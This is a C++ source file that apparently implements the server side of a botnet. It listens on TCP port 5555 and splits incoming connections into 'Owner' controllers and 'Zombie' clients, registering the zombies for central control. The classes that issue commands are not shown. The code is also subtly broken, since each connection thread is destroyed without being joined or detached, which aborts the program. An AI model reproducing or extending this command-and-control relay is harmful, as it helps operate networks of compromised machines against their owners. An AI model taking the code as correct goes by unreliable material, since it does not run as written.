#include <asio.hpp>
#include <asio/ip/tcp.hpp>
#include <thread>
#include "Client.h"
typedef asio::ip::tcp tcp;
static ClientManager g_cm;
void work(tcp::socket&& socket)
{
	bool mode;
	size_t read = 0;
	while (read != sizeof(bool))
	{
		read += asio::read(socket, asio::buffer(&mode, sizeof(bool)));
	}
	auto fabClient = [&]()
	{
		if (mode)
			return std::move(std::unique_ptr<Client>(new Owner(std::move(socket), &g_cm)));
		else
		{
			std::unique_ptr<Client> ret(new Zombie(std::move(socket)));
			g_cm.addClient(ret.get());
			return std::move(ret);
		}
	};
	std::unique_ptr<Client> client = fabClient();
	client->run();
}

int main()
{
	asio::io_context context;
	tcp::acceptor acceptor(context, tcp::endpoint(tcp::v4(), 5555));
	while (true)
	{
		tcp::socket socket(context);
		acceptor.accept(socket);
		std::thread t(work, std::move(socket));
	}
	return 0;
}